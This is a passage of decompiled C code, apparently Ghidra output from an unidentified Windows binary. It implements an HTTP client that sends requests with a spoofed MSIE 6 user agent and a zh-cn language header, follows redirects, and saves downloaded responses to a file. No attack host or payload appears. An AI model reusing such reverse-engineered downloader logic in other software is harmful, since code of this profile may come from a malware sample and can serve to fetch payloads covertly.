  undefined4 local_ab;
  undefined2 uStack_a7;
  undefined uStack_a5;
  undefined4 local_a4;
  undefined4 local_a0;
  undefined4 local_9c;
  undefined4 uStack_98;
  undefined4 local_94;
  undefined4 uStack_90;
  undefined2 uStack_8c;
  undefined4 local_8a;
  undefined2 uStack_86;
  undefined4 local_84;
  undefined4 uStack_80;
  undefined2 uStack_7c;
  undefined4 local_7a;
  undefined2 uStack_76;
  undefined4 local_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  char cStack_68;
  undefined2 local_67;
  undefined uStack_65;
  undefined4 local_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined2 uStack_58;
  char cStack_56;
  undefined local_55;
  undefined4 local_54;
  undefined4 uStack_50;
  undefined2 uStack_4c;
  undefined4 local_4a;
  undefined2 uStack_46;
  undefined4 local_44 [3];
  undefined uStack_38;
  undefined2 local_37;
  undefined uStack_35;
  undefined4 local_34;
  undefined uStack_30;
  undefined2 local_2f;
  undefined uStack_2d;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined2 uStack_20;
  char cStack_1e;
  undefined local_1d;
  undefined4 local_1c;
  undefined2 uStack_18;
  undefined2 local_16;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined2 uStack_8;
  char cStack_6;
  undefined local_5;
  
  local_44[0] = DAT_0040e540;
  local_44[1] = 0;
  local_44[2] = DAT_0040e538;
  uStack_38 = DAT_0040e53c;
  local_37 = 0;
  uStack_35 = 0;
  local_34 = DAT_0040e530;
  uStack_30 = DAT_0040e534;
  local_2f = 0;
  uStack_2d = 0;
  local_2c = DAT_0040e524;
  local_28 = 0;
  local_24 = s_DELETE_0040e528._0_4_;
  uStack_20 = s_DELETE_0040e528._4_2_;
  cStack_1e = s_DELETE_0040e528[6];
  local_1d = 0;
  local_1c = s_TRACE_0040e51c._0_4_;
  uStack_18 = s_TRACE_0040e51c._4_2_;
  local_16 = 0;
  local_14 = s_CONNECT_0040e50c._0_4_;
  local_10 = s_CONNECT_0040e50c._4_4_;
  local_c = s_OPTION_0040e514._0_4_;
  uStack_8 = s_OPTION_0040e514._4_2_;
  cStack_6 = s_OPTION_0040e514[6];
  local_5 = 0;
  local_c4 = s_no_cache_0040e500._0_4_;
  uStack_c0 = s_no_cache_0040e500._4_4_;
  cStack_bc = s_no_cache_0040e500[8];
  local_bb = 0;
  uStack_b7 = 0;
  uStack_b5 = 0;
  local_b4 = s_no_store_0040e4f4._0_4_;
  uStack_b0 = s_no_store_0040e4f4._4_4_;
  cStack_ac = s_no_store_0040e4f4[8];
  local_ab = 0;
  uStack_a7 = 0;
  uStack_a5 = 0;
  local_a4 = s_max_age_0040e4ec._0_4_;
  local_a0 = s_max_age_0040e4ec._4_4_;
  local_9c = 0;
  uStack_98 = 0;
  local_94 = s_max_stale_0040e4e0._0_4_;
  uStack_90 = s_max_stale_0040e4e0._4_4_;
  uStack_8c = s_max_stale_0040e4e0._8_2_;
  local_8a = 0;
  uStack_86 = 0;
  local_84 = s_min_fresh_0040e4d4._0_4_;
  uStack_80 = s_min_fresh_0040e4d4._4_4_;
  uStack_7c = s_min_fresh_0040e4d4._8_2_;
  local_7a = 0;
  uStack_76 = 0;
  local_74 = s_no_transform_0040e4c4._0_4_;
  uStack_70 = s_no_transform_0040e4c4._4_4_;
  uStack_6c = s_no_transform_0040e4c4._8_4_;
  cStack_68 = s_no_transform_0040e4c4[12];
  local_67 = 0;
  uStack_65 = 0;
  local_64 = s_only_if_cached_0040e4b4._0_4_;
  uStack_60 = s_only_if_cached_0040e4b4._4_4_;
  uStack_5c = s_only_if_cached_0040e4b4._8_4_;
  uStack_58 = s_only_if_cached_0040e4b4._12_2_;
  cStack_56 = s_only_if_cached_0040e4b4[14];
  local_55 = 0;
  local_54 = s_extension_0040e4a8._0_4_;
  uStack_50 = s_extension_0040e4a8._4_4_;
  uStack_4c = s_extension_0040e4a8._8_2_;
  local_4a = 0;
  uStack_46 = 0;
  bVar1 = FUN_00404e4a((int)this);
  if (((((CONCAT31(extraout_var,bVar1) == 0) && (param_1 != (char *)0x0)) &&
       (sVar2 = strlen(param_1), sVar2 != 0)) && ((-1 < param_3 && (param_3 < 8)))) &&
     ((-1 < param_4 &&
      ((param_4 < 8 && (iVar3 = FUN_004035cb((void *)((int)this + 4),param_1), iVar3 != 0)))))) {
    _Str2 = &DAT_0040e404;
    pcVar4 = (char *)FUN_00403b6d((undefined4 *)((int)this + 4));
    iVar3 = _stricmp(pcVar4,_Str2);
    if (iVar3 == 0) {
      *(int *)((int)this + 0x50) = param_3;
      if (*(void **)((int)this + 0x4c) != (void *)0x0) {
        operator_delete(*(void **)((int)this + 0x4c));
      }
      iVar3 = FUN_00403b89((int)this + 4);
      if (iVar3 == 0) {
        sVar2 = 0;
      }
      else {
        pcVar4 = (char *)FUN_00403b89((int)this + 4);
        sVar2 = strlen(pcVar4);
      }
      pvVar5 = operator_new(sVar2 + 0x20);
      *(void **)((int)this + 0x4c) = pvVar5;
      uVar6 = FUN_00403b89((int)this + 4);
      sprintf(*(char **)((int)this + 0x4c),s__s__s_HTTP_1_1_0040e494,local_44 + param_3 * 2,uVar6);
      FUN_004042d3(this,1,(char *)((int)&local_c4 + param_4 * 0x10));
      pcVar4 = s_Keep_Alive_0040e488;
      if (param_2 == 0) {
        pcVar4 = s_Close_0040e480;
      }
      FUN_004042d3(this,2,pcVar4);
      pcVar4 = (char *)FUN_00403b75((int)this + 4);
      FUN_004042d3(this,0x26,pcVar4);
      FUN_004042d3(this,0x1f,&DAT_0040e47c);
      FUN_004042d3(this,0x1b,s_application_x_www_form_urlencode_0040e458);
      FUN_004042d3(this,0x31,s_Mozilla_4_0__compatible__MSIE_6__0040e414);
      FUN_004042d3(this,0x22,s_zh_cn__0040e40c);
      return 1;
    }
  }
  return 0;
}



undefined4 __thiscall FUN_00404107(void *this,char *param_1)

{
  size_t sVar1;
  void *pvVar2;
  
  if ((param_1 != (char *)0x0) && (sVar1 = strlen(param_1), sVar1 != 0)) {
    if (*(void **)((int)this + 0x40) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x40));
    }
    strlen(param_1);
    sVar1 = strlen(param_1);
    pvVar2 = operator_new(sVar1 + 1);
    *(void **)((int)this + 0x40) = pvVar2;
    sVar1 = strlen(param_1);
    memcpy(*(void **)((int)this + 0x40),param_1,sVar1);
    sVar1 = strlen(param_1);
    *(undefined *)(sVar1 + *(int *)((int)this + 0x40)) = 0;
    return 1;
  }
  if (*(void **)((int)this + 0x40) != (void *)0x0) {
    operator_delete(*(void **)((int)this + 0x40));
  }
  *(undefined4 *)((int)this + 0x40) = 0;
  return 1;
}



undefined4 __thiscall FUN_0040417e(void *this,char *param_1,char *param_2)

{
  size_t sVar1;
  size_t sVar2;
  char *pcVar3;
  uint uVar4;
  size_t sVar5;
  
  sVar5 = 0;
  if ((param_1 != (char *)0x0) && (sVar1 = strlen(param_1), sVar1 != 0)) {
    if (*(char **)((int)this + 0x11c) == (char *)0x0) {
      if (param_2 == (char *)0x0) {
        sVar5 = 0;
      }
      else {
        sVar5 = strlen(param_2);
      }
      sVar1 = strlen(param_1);
      pcVar3 = (char *)operator_new((int)(sVar1 + sVar5 + 0x101) / 0x100 << 8);
      if (param_2 == (char *)0x0) {
        param_2 = &DAT_0040e9e8;
      }
      sprintf(pcVar3,s__s__s_0040e544,param_1,param_2);
      *(char **)((int)this + 0x11c) = pcVar3;
    }
    else {
      sVar1 = strlen(*(char **)((int)this + 0x11c));
      if (param_2 != (char *)0x0) {
        sVar5 = strlen(param_2);
      }
      sVar2 = strlen(param_1);
      uVar4 = (int)(sVar2 + sVar5 + sVar1 + 0x102) / 0x100 << 8;
      if (((int)(sVar1 + 0x100) / 0x100) * 0x100 == uVar4) {
        if (param_2 == (char *)0x0) {
          param_2 = &DAT_0040e9e8;
        }
        sprintf((char *)(*(int *)((int)this + 0x11c) + sVar1),s___s__s_0040e558,param_1,param_2);
      }
      else {
        pcVar3 = (char *)operator_new(uVar4);
        if (param_2 == (char *)0x0) {
          param_2 = &DAT_0040e9e8;
        }
        sprintf(pcVar3,s__s__s__s_0040e54c,*(undefined4 *)((int)this + 0x11c),param_1,param_2);
        operator_delete(*(void **)((int)this + 0x11c));
        *(char **)((int)this + 0x11c) = pcVar3;
      }
    }
    return 1;
  }
  return 0;
}



undefined4 __thiscall FUN_004042d3(void *this,int param_1,char *param_2)

{
  char **ppcVar1;
  void *pvVar2;
  size_t sVar3;
  size_t sVar4;
  char *_Dest;
  undefined4 uVar5;
  
  if ((param_1 < 1) || (0x31 < param_1)) {
    uVar5 = 0;
  }
  else {
    pvVar2 = *(void **)((int)this + param_1 * 4 + 0x54);
    ppcVar1 = (char **)((int)this + param_1 * 4 + 0x54);
    if (pvVar2 != (void *)0x0) {
      operator_delete(pvVar2);
    }
    *ppcVar1 = (char *)0x0;
    if (param_2 != (char *)0x0) {
      sVar3 = strlen("UnKnow: " + param_1 * 0x20);
      sVar4 = strlen(param_2);
      _Dest = (char *)operator_new(sVar3 + 3 + sVar4);
      *ppcVar1 = _Dest;
      sprintf(_Dest,s__s_s_0040e560,"UnKnow: " + param_1 * 0x20,param_2);
    }
    uVar5 = 1;
  }
  return uVar5;
}



undefined4 __thiscall FUN_0040434a(void *this,void *param_1)

{
  if ((*(void **)((int)this + 0x3c) == param_1) && (param_1 != (void *)0xb)) {
    return 1;
  }
  switch(param_1) {
  case (void *)0x0:
    if (*(HANDLE *)((int)this + 0x44) != (HANDLE)0x0) {
      CloseHandle(*(HANDLE *)((int)this + 0x44));
      *(undefined4 *)((int)this + 0x44) = 0;
    }
    if (*(void **)((int)this + 0x30) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x30));
      *(undefined4 *)((int)this + 0x30) = 0;
    }
    goto switchD_00404372_caseD_3;
  case (void *)0x1:
    *(undefined4 *)((int)this + 0x3c) = 1;
    break;
  case (void *)0x2:
    *(undefined4 *)((int)this + 0x3c) = 2;
    break;
  case (void *)0x3:
  case (void *)0x5:
    goto switchD_00404372_caseD_3;
  case (void *)0x4:
    *(undefined4 *)((int)this + 0x3c) = 4;
    break;
  case (void *)0x6:
    *(undefined4 *)((int)this + 0x3c) = 6;
    break;
  case (void *)0x7:
    *(undefined4 *)((int)this + 0x3c) = 7;
    break;
  case (void *)0x8:
    *(undefined4 *)((int)this + 0x3c) = 8;
    break;
  case (void *)0x9:
    *(undefined4 *)((int)this + 0x3c) = 9;
    break;
  case (void *)0xa:
    if (*(HANDLE *)((int)this + 0x44) != (HANDLE)0x0) {
      CloseHandle(*(HANDLE *)((int)this + 0x44));
      *(undefined4 *)((int)this + 0x44) = 0;
    }
    *(undefined4 *)((int)this + 0x3c) = 0;
    if (*(uint **)((int)this + 0x38) != (uint *)0x0) {
                    // WARNING: Load size is inaccurate
      FUN_00407ecf(*this,*(uint **)((int)this + 0x38));
    }
    goto LAB_00404443;
  case (void *)0xb:
    *(undefined4 *)((int)this + 0x3c) = 0xb;
    break;
  case (void *)0xc:
    if (*(HANDLE *)((int)this + 0x44) != (HANDLE)0x0) {
      CloseHandle(*(HANDLE *)((int)this + 0x44));
      *(undefined4 *)((int)this + 0x44) = 0;
    }
    *(undefined4 *)((int)this + 0x34) = 1;
    goto switchD_00404372_caseD_3;
  case (void *)0xd:
    if (*(HANDLE *)((int)this + 0x44) != (HANDLE)0x0) {
      CloseHandle(*(HANDLE *)((int)this + 0x44));
      *(undefined4 *)((int)this + 0x44) = 0;
    }
switchD_00404372_caseD_3:
    *(undefined4 *)((int)this + 0x3c) = 0;
LAB_00404443:
    SetEvent(*(HANDLE *)((int)this + 0x48));
  }
  return 1;
}



int __thiscall FUN_0040448b(void *this,int param_1)

{
  undefined2 uVar1;
  undefined2 extraout_var;
  char *pcVar3;
  uint *puVar4;
  int iVar5;
  int iVar6;
  void **ppvVar7;
  void *pvVar8;
  int iVar9;
  uint uVar10;
  int iVar11;
  undefined4 uVar2;
  
  do {
    if ((*(int *)((int)this + 0x3c) != 0) || (*(int *)((int)this + 0x4c) == 0)) goto LAB_004045d8;
    ppvVar7 = (void **)((int)this + 300);
    iVar6 = 0x1e;
    do {
      if (*ppvVar7 != (void *)0x0) {
        operator_delete(*ppvVar7);
        *ppvVar7 = (void *)0x0;
      }
      ppvVar7 = ppvVar7 + 1;
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
    if (*(void **)((int)this + 0x1a4) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x1a4));
    }
    if (*(void **)((int)this + 0x120) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x120));
    }
    if (*(void **)((int)this + 0x128) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x128));
    }
    if (*(void **)((int)this + 0x1b4) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x1b4));
    }
    memset((void *)((int)this + 0x120),0,0x98);
    ResetEvent(*(HANDLE *)((int)this + 0x48));
    iVar6 = 1;
    *(undefined4 *)((int)this + 0x34) = 0;
    FUN_0040434a(this,(void *)0x1);
    if (param_1 == 0) goto LAB_004045d8;
    if (*(int *)((int)this + 0x38) == 0) {
      uVar10 = 0;
      pvVar8 = this;
      uVar1 = FUN_00403b70((int)this + 4);
      uVar2 = CONCAT22(extraout_var,uVar1);
      pcVar3 = (char *)FUN_00403b75((int)this + 4);
                    // WARNING: Load size is inaccurate
      puVar4 = FUN_00407dab(*this,pcVar3,uVar2,(uint)pvVar8,uVar10);
      *(uint **)((int)this + 0x38) = puVar4;
      if (puVar4 == (uint *)0x0) {
        FUN_0040434a(this,(void *)0x3);
        goto LAB_004045d8;
      }
    }
    FUN_0040434a(this,(void *)0x2);
    FUN_0040434a(this,(void *)0x4);
    iVar5 = FUN_00404610((void **)this);
    if (iVar5 == 0) {
      FUN_0040434a(this,(void *)0x5);
                    // WARNING: Load size is inaccurate
      FUN_00407ecf(*this,*(uint **)((int)this + 0x38));
      goto LAB_004045d8;
    }
    FUN_0040434a(this,(void *)0x6);
    WaitForSingleObject(*(HANDLE *)((int)this + 0x48),0xffffffff);
    if (*(int *)((int)this + 0x34) == 0) goto LAB_004045d8;
    if (*(int *)((int)this + 0x124) != 0x12e) break;
    FUN_00404916((void **)this);
    iVar11 = 0;
    iVar9 = 0;
    iVar5 = 0;
    pcVar3 = (char *)FUN_00404e2f(this,0xf);
    iVar5 = FUN_00403e5d(this,pcVar3,iVar5,iVar9,iVar11);
    param_1 = iVar6;
  } while (iVar5 != 0);
  if ((*(uint *)((int)this + 0x124) < 200) || (299 < *(uint *)((int)this + 0x124))) {
LAB_004045d8:
    iVar6 = 0;
  }
  return iVar6;
}



// WARNING: Type propagation algorithm not settling

undefined4 __fastcall FUN_00404610(void **param_1)

{
  void **ppvVar1;
  bool bVar2;
  int iVar3;
  size_t sVar4;
  size_t sVar5;
  size_t sVar6;
  size_t sVar7;
  undefined *puVar8;
  size_t sVar9;
  void *pvVar10;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  char **ppcVar11;
  undefined4 uVar12;
  uint uVar13;
  char *pcVar14;
  char local_30;
  undefined4 local_2f;
  undefined4 uStack_2b;
  undefined4 uStack_27;
  undefined2 uStack_23;
  undefined uStack_21;
  undefined *local_20;
  undefined *local_1c;
  undefined *local_18;
  undefined *local_14;
  char **local_10;
  undefined *local_c;
  char *local_8;
  
  if ((char *)param_1[0x47] == (char *)0x0) {
    local_c = (undefined *)0x0;
  }
  else {
    local_c = (undefined *)strlen((char *)param_1[0x47]);
  }
  sVar9 = (size_t)local_c;
  pvVar10 = param_1[0x14];
  local_8 = (char *)0x0;
  if (pvVar10 == (void *)0x0) {
    FUN_004042d3(param_1,0x17,(char *)0x0);
    if (sVar9 == 0) {
      local_8 = (char *)param_1[0x13];
    }
    else {
      ppvVar1 = param_1 + 1;
      iVar3 = FUN_00403b79((int)ppvVar1);
      if (iVar3 == 0) {
        sVar4 = 0;
      }
      else {
        pcVar14 = (char *)FUN_00403b79((int)ppvVar1);
        sVar4 = strlen(pcVar14);
      }
      iVar3 = FUN_00403b81((int)ppvVar1);
      if (iVar3 == 0) {
        sVar5 = 0;
      }
      else {
        pcVar14 = (char *)FUN_00403b81((int)ppvVar1);
        sVar5 = strlen(pcVar14);
      }
      iVar3 = FUN_00403b85((int)ppvVar1);
      if (iVar3 == 0) {
        sVar6 = 0;
      }
      else {
        pcVar14 = (char *)FUN_00403b85((int)ppvVar1);
        sVar6 = strlen(pcVar14);
      }
      iVar3 = FUN_00403b7d((int)ppvVar1);
      if (iVar3 == 0) {
        sVar7 = 0;
      }
      else {
        pcVar14 = (char *)FUN_00403b7d((int)ppvVar1);
        sVar7 = strlen(pcVar14);
      }
      local_8 = (char *)operator_new(sVar7 + 0x20 + sVar9 + sVar4 + sVar5 + sVar6);
      iVar3 = FUN_00403b85((int)ppvVar1);
      if (iVar3 == 0) {
        local_10 = (char **)&DAT_0040e9e8;
      }
      else {
        local_10 = (char **)FUN_00403b85((int)ppvVar1);
      }
      iVar3 = FUN_00403b85((int)ppvVar1);
      local_c = &DAT_0040e598;
      if (iVar3 == 0) {
        local_c = &DAT_0040e9e8;
      }
      iVar3 = FUN_00403b81((int)ppvVar1);
      if (iVar3 == 0) {
        local_14 = &DAT_0040e9e8;
      }
      else {
        local_14 = (undefined *)FUN_00403b81((int)ppvVar1);
      }
      iVar3 = FUN_00403b81((int)ppvVar1);
      local_18 = &DAT_0040e594;
      if (iVar3 == 0) {
        local_18 = &DAT_0040e9e8;
      }
      iVar3 = FUN_00403b7d((int)ppvVar1);
      if (iVar3 == 0) {
        local_1c = &DAT_0040e9e8;
      }
      else {
        local_1c = (undefined *)FUN_00403b7d((int)ppvVar1);
      }
      iVar3 = FUN_00403b7d((int)ppvVar1);
      local_20 = &DAT_0040e590;
      if (iVar3 == 0) {
        local_20 = &DAT_0040e9e8;
      }
      iVar3 = FUN_00403b79((int)ppvVar1);
      if (iVar3 == 0) {
        puVar8 = &DAT_0040e9e8;
      }
      else {
        puVar8 = (undefined *)FUN_00403b79((int)ppvVar1);
      }
      sprintf(local_8,s_GET__s__s_s_s_s_s_s_s_HTTP_1_1_0040e56c,puVar8,param_1[0x47],local_20,
              local_1c,local_18,local_14,local_c,local_10);
      local_c = (undefined *)0x0;
    }
  }
  else if ((0 < (int)pvVar10) && ((int)pvVar10 < 8)) {
    local_8 = (char *)param_1[0x13];
    if (local_c == (undefined *)0x0) {
      pcVar14 = (char *)0x0;
    }
    else {
      local_30 = '\0';
      local_2f = 0;
      uStack_2b = 0;
      uStack_27 = 0;
      uStack_23 = 0;
      uStack_21 = 0;
      sprintf(&local_30,&DAT_0040e59c,local_c);
      pcVar14 = &local_30;
    }
    FUN_004042d3(param_1,0x17,pcVar14);
  }
  sVar9 = strlen(local_8);
  ppcVar11 = (char **)(param_1 + 0x15);
  uVar13 = sVar9 + 2;
  local_20 = (undefined *)0x32;
  do {
    if (*ppcVar11 != (char *)0x0) {
      sVar9 = strlen(*ppcVar11);
      uVar13 = uVar13 + sVar9;
    }
    ppcVar11 = ppcVar11 + 1;
    local_20 = (undefined *)((int)local_20 + -1);
  } while (local_20 != (undefined *)0x0);
  pvVar10 = operator_new(uVar13);
  sVar9 = strlen(local_8);
  memcpy(pvVar10,local_8,sVar9);
  local_10 = (char **)(param_1 + 0x15);
  local_20 = (undefined *)0x32;
  do {
    if (*local_10 != (char *)0x0) {
      local_1c = (undefined *)strlen(*local_10);
      memcpy((void *)((int)pvVar10 + sVar9),*local_10,(size_t)local_1c);
      sVar9 = sVar9 + (int)local_1c;
    }
    local_10 = local_10 + 1;
    local_20 = (undefined *)((int)local_20 + -1);
  } while (local_20 != (undefined *)0x0);
  memcpy((void *)((int)pvVar10 + sVar9),&DAT_0040e568,2);
  if (local_c == (undefined *)0x0) {
    bVar2 = FUN_004080ff(*param_1,(uint *)param_1[0xe],sVar9 + 2,pvVar10);
    if (CONCAT31(extraout_var_00,bVar2) != 0) goto LAB_004048f6;
    if (local_8 != (char *)param_1[0x13]) {
      operator_delete(local_8);
    }
  }
  else {
    bVar2 = FUN_00407f27(*param_1,(uint *)param_1[0xe],sVar9 + 2,pvVar10,(size_t)local_c,
                         param_1[0x47]);
    if (CONCAT31(extraout_var,bVar2) != 0) {
LAB_004048f6:
      if (local_8 != (char *)param_1[0x13]) {
        operator_delete(local_8);
      }
      uVar12 = 1;
      goto LAB_00404908;
    }
  }
  uVar12 = 0;
LAB_00404908:
  operator_delete(pvVar10);
  return uVar12;
}



undefined4 __fastcall FUN_00404916(void **param_1)

{
  if ((uint *)param_1[0xe] != (uint *)0x0) {
    FUN_00407ecf(*param_1,(uint *)param_1[0xe]);
    param_1[0xe] = (void *)0x0;
    FUN_0040434a(param_1,(void *)0x0);
  }
  return 0;
}



void __fastcall FUN_00404939(void *param_1)

{
  *(undefined4 *)((int)param_1 + 0x38) = 0;
  FUN_0040434a(param_1,(void *)0xd);
  return;
}



void __thiscall FUN_00404947(void *this,size_t param_1,char *param_2)

{
  size_t sVar1;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  HANDLE pvVar5;
  char *_Src;
  char *pcVar6;
  void *pvVar7;
  
  _Src = param_2;
  if (*(int *)((int)this + 0x3c) < 7) {
    FUN_0040434a(this,(void *)0x7);
  }
  pcVar6 = _Src;
  if (*(int *)((int)this + 0x3c) < 9) {
    while (sVar1 = param_1 - 1, param_1 != 0) {
      if (*pcVar6 == '\n') {
        if (*(int *)((int)this + 0x1a4) == 0) {
          uVar4 = (int)pcVar6 - (int)_Src;
          if ((int)uVar4 < 2) {
            FUN_0040434a(this,(void *)0x9);
            _Src = pcVar6 + 1;
            if ((*(char **)((int)this + 0x40) != (char *)0x0) && (*(int *)((int)this + 0x44) == 0))
            {
              iVar3 = strcmp(*(char **)((int)this + 0x40),&DAT_0040e3f4);
              if (iVar3 == 0) {
                if ((*(uint *)((int)this + 0x1ac) != 0) && (*(int *)((int)this + 0x30) == 0)) {
                  pvVar7 = operator_new(*(uint *)((int)this + 0x1ac));
                  *(void **)((int)this + 0x30) = pvVar7;
                  memset(pvVar7,0,*(size_t *)((int)this + 0x1ac));
                }
              }
              else {
                pvVar5 = CreateFileA(*(LPCSTR *)((int)this + 0x40),0x40000000,3,
                                     (LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
                *(HANDLE *)((int)this + 0x44) = pvVar5;
                if (pvVar5 == (HANDLE)0xffffffff) {
                  *(undefined4 *)((int)this + 0x44) = 0;
                }
              }
            }
            break;
          }
          param_2 = (char *)operator_new(uVar4);
          memcpy(param_2,_Src,uVar4);
          pcVar6[(int)(param_2 + (-1 - (int)_Src))] = '\0';
          if (*(int *)((int)this + 0x3c) < 8) {
            iVar3 = FUN_00404c7b(this,param_2);
            if (iVar3 == 0) {
              operator_delete(param_2);
              goto LAB_00404ae5;
            }
            FUN_0040434a(this,(void *)0x8);
          }
          else {
            iVar3 = FUN_00404d95(this,param_2);
            if (iVar3 == 0x17) {
              iVar3 = atoi(*(char **)((int)this + 0x188));
              *(int *)((int)this + 0x1ac) = iVar3;
            }
          }
          operator_delete(param_2);
        }
        else {
          param_2 = (char *)operator_new((uint)(pcVar6 + (*(int *)((int)this + 0x1a8) - (int)_Src)))
          ;
          memcpy(param_2,*(void **)((int)this + 0x1a4),*(size_t *)((int)this + 0x1a8));
          memcpy(param_2 + *(int *)((int)this + 0x1a8),_Src,(int)pcVar6 - (int)_Src);
          pcVar2 = param_2;
          (param_2 + (*(int *)((int)this + 0x1a8) - (int)_Src) + -1)[(int)pcVar6] = '\0';
          if (*(int *)((int)this + 0x3c) < 8) {
            iVar3 = FUN_00404c7b(this,param_2);
            if (iVar3 == 0) {
              operator_delete(pcVar2);
              operator_delete(*(void **)((int)this + 0x1a4));
              *(undefined4 *)((int)this + 0x1a4) = 0;
LAB_00404ae5:
              pvVar7 = (void *)0xa;
              goto LAB_00404c6a;
            }
            FUN_0040434a(this,(void *)0x8);
          }
          else {
            iVar3 = FUN_00404d95(this,param_2);
            if (iVar3 == 0x17) {
              iVar3 = atoi(*(char **)((int)this + 0x188));
              *(int *)((int)this + 0x1ac) = iVar3;
            }
          }
          operator_delete(pcVar2);
          operator_delete(*(void **)((int)this + 0x1a4));
          *(undefined4 *)((int)this + 0x1a4) = 0;
          *(undefined4 *)((int)this + 0x1a8) = 0;
        }
        _Src = pcVar6 + 1;
      }
      pcVar6 = pcVar6 + 1;
      param_1 = sVar1;
    }
    param_1 = sVar1;
    if (*(int *)((int)this + 0x3c) < 9) {
      uVar4 = (int)pcVar6 - (int)_Src;
      if (uVar4 != 0) {
        if (*(int *)((int)this + 0x1a4) == 0) {
          pvVar7 = operator_new(uVar4);
          *(void **)((int)this + 0x1a4) = pvVar7;
          memcpy(pvVar7,_Src,uVar4);
          *(uint *)((int)this + 0x1a8) = uVar4;
        }
        else {
          param_2 = (char *)operator_new((uint)(pcVar6 + (*(int *)((int)this + 0x1a8) - (int)_Src)))
          ;
          memcpy(param_2,*(void **)((int)this + 0x1a4),*(size_t *)((int)this + 0x1a8));
          memcpy(param_2 + *(int *)((int)this + 0x1a8),_Src,uVar4);
          operator_delete(*(void **)((int)this + 0x1a4));
          *(char **)((int)this + 0x1a8) = pcVar6 + ((int)*(char **)((int)this + 0x1a8) - (int)_Src);
          *(char **)((int)this + 0x1a4) = param_2;
        }
      }
    }
  }
  if ((*(int *)((int)this + 0x3c) == 0xb) || (*(int *)((int)this + 0x3c) == 9)) {
    if (*(int *)((int)this + 0x30) != 0) {
      memcpy((void *)(*(int *)((int)this + 0x1b0) + *(int *)((int)this + 0x30)),_Src,param_1);
    }
    *(int *)((int)this + 0x1b0) = *(int *)((int)this + 0x1b0) + param_1;
    FUN_0040434a(this,(void *)0xb);
    if (*(HANDLE *)((int)this + 0x44) != (HANDLE)0x0) {
      param_2 = (char *)0x0;
      WriteFile(*(HANDLE *)((int)this + 0x44),_Src,param_1,(LPDWORD)&param_2,(LPOVERLAPPED)0x0);
    }
    if (*(int *)((int)this + 0x1b0) == *(int *)((int)this + 0x1ac)) {
      pvVar7 = (void *)0xc;
LAB_00404c6a:
      FUN_0040434a(this,pvVar7);
    }
  }
  return;
}



void FUN_00404c78(void)

{
  return;
}



undefined4 __thiscall FUN_00404c7b(void *this,char *param_1)

{
  size_t sVar1;
  int iVar2;
  char *pcVar3;
  void *pvVar4;
  char *pcVar5;
  
  if ((((param_1 != (char *)0x0) && (sVar1 = strlen(param_1), 7 < sVar1)) &&
      (iVar2 = _strnicmp(param_1,&DAT_0040e404,4), iVar2 == 0)) &&
     ((pcVar3 = strchr(param_1,0x20), pcVar3 != (char *)0x0 &&
      (sVar1 = (int)pcVar3 - (int)param_1, sVar1 != 0)))) {
    if (*(void **)((int)this + 0x120) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x120));
    }
    if (-1 < (int)sVar1) {
      pvVar4 = operator_new(sVar1 + 1);
      *(void **)((int)this + 0x120) = pvVar4;
      memcpy(pvVar4,param_1,sVar1);
      pcVar3[*(int *)((int)this + 0x120) - (int)param_1] = '\0';
    }
    pcVar3 = pcVar3 + 1;
    pcVar5 = strchr(pcVar3,0x20);
    if ((pcVar5 != (char *)0x0) && (pcVar5 != pcVar3)) {
      iVar2 = atoi(pcVar3);
      *(int *)((int)this + 0x124) = iVar2;
      pcVar5 = pcVar5 + 1;
      if (*(void **)((int)this + 0x128) != (void *)0x0) {
        operator_delete(*(void **)((int)this + 0x128));
      }
      strlen(pcVar5);
      sVar1 = strlen(pcVar5);
      pvVar4 = operator_new(sVar1 + 1);
      *(void **)((int)this + 0x128) = pvVar4;
      sVar1 = strlen(pcVar5);
      memcpy(*(void **)((int)this + 0x128),pcVar5,sVar1);
      sVar1 = strlen(pcVar5);
      *(undefined *)(sVar1 + *(int *)((int)this + 0x128)) = 0;
      return 1;
    }
  }
  return 0;
}



int __thiscall FUN_00404d95(void *this,char *param_1)

{
  void **ppvVar1;
  size_t sVar2;
  size_t _MaxCount;
  int iVar3;
  size_t _Size;
  void *_Dst;
  int local_c;
  char *local_8;
  
  sVar2 = strlen(param_1);
  local_c = 1;
  local_8 = "Cache-Control: ";
  while ((_MaxCount = strlen(local_8), (int)sVar2 <= (int)_MaxCount ||
         (iVar3 = strncmp(param_1,local_8,_MaxCount), iVar3 != 0))) {
    local_8 = local_8 + 0x20;
    local_c = local_c + 1;
    if (0x40bc23 < (int)local_8) {
      return 0;
    }
  }
  _Size = sVar2 - _MaxCount;
  if ((int)_Size < 0) {
    return local_c;
  }
  _Dst = operator_new(_Size + 1);
  ppvVar1 = (void **)((int)this + local_c * 4 + 300);
  *ppvVar1 = _Dst;
  memcpy(_Dst,param_1 + _MaxCount,_Size);
  *(undefined *)((sVar2 - _MaxCount) + (int)*ppvVar1) = 0;
  return local_c;
}



undefined4 __thiscall FUN_00404e2f(void *this,int param_1)

{
  undefined4 uVar1;
  
  if ((param_1 < 1) || (0x1d < param_1)) {
    uVar1 = 0;
  }
  else {
    uVar1 = *(undefined4 *)((int)this + param_1 * 4 + 300);
  }
  return uVar1;
}



bool __fastcall FUN_00404e4a(int param_1)

{
  return *(int *)(param_1 + 0x3c) != 0;
}



undefined4 __thiscall FUN_00404e53(void *this,undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = *(undefined4 *)((int)this + 0x1b0);
  }
  return *(undefined4 *)((int)this + 0x30);
}



undefined4 * FUN_00404e69(void)

{
  undefined4 *extraout_ECX;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  FUN_00403b8d(extraout_ECX + 1);
